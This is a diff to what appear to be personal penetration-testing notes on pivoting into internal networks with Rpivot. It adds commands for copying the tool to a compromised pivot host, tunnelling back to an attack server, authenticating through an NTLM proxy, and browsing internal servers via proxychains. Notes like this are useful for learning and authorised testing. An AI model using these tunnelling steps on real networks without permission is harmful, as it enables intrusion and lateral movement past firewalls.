@@ -111,7 +111,7 @@ $ proxychains nmap -sn -v <target_internal_subnet>
 ### Web Server Pivoting with Rpivot
 [Rpivot](https://github.com/klsecservices/rpivot) us a reverse SOCKS proxy written in python, for SOCKS tunnelling. It allows us to bind a machine inside an internal network to an external server and exposes the client's local port on the server-side. This lets us access internal web servers from the outside.
 ![[rpivot-webserver.webp]]
-1. Rpivot requires python 2.7, so we might need to install it
+1. [Rpivot](https://github.com/klsecservices/rpivot) requires python 2.7, so we might need to also install it (*we also require it on both the attack host and pivot host*)
 ```bash
 git clone https://github.com/klsecservices/rpivot.git
 sudo apt-get install python2.7
@@ -120,7 +120,21 @@ sudo apt-get install python2.7
 ```bash
 python2.7 server.py --proxy-port <port_to_use_for_proxy> --server-port <port_to_connect_to_server> --server-ip 0.0.0.0
 ```
+3. Transfer the [Rpivot](https://github.com/klsecservices/rpivot) files over to the pivot host (*should be easy to do with `scp`*) and then run `client.py` to connect to our server
+```bash
+scp -r rpivot <user>@<pivot_host>:~/
 
+# Now on the pivot host
+python2.7 client.py --server-ip <our_server_ip/attack_box_ip> --server-port <server_port>
+```
+> Some enterprise networks will use a Domain controlled [HTTP-proxy with NTLM authentication](https://learn.microsoft.com/en-us/openspecs/office_protocols/ms-grvhenc/b9e676e7-e787-4020-9840-7cfe7c76044a). This will prevent us directly pivoting to our external server and will require us to authenticate with NTLM first.
+> `python2.7 client.py --server-ip <our_server_ip/attack_box_ip> --server-port <server_port> --ntlm-proxy-ip <ip_of_proxy> --ntlm-proxy-port <port> --domain <windows_domain_name> --username <user> --password <pass>`
+4. Configure [[Proxychains]]
+![[Proxychains#Configuration]]
+5. Use [[Proxychains]] to open the webserver in a browser
+```bash
+proxychains firefox-esr <internal_ip_of_webserver>:<port>
+```
 
 ## Port Forwarding
 Port forwarding is *redirecting a communication request from one port to another*. TCP is used as the primary communication layer but application layer protocols like SSH or even [SOCKS](https://en.wikipedia.org/wiki/SOCKS) (non-application layer) can be used to encapsulate the forwarded traffic. Port forwarding can be a useful technique for bypassing firewalls and using existing services on the compromised host to pivot to other networks.
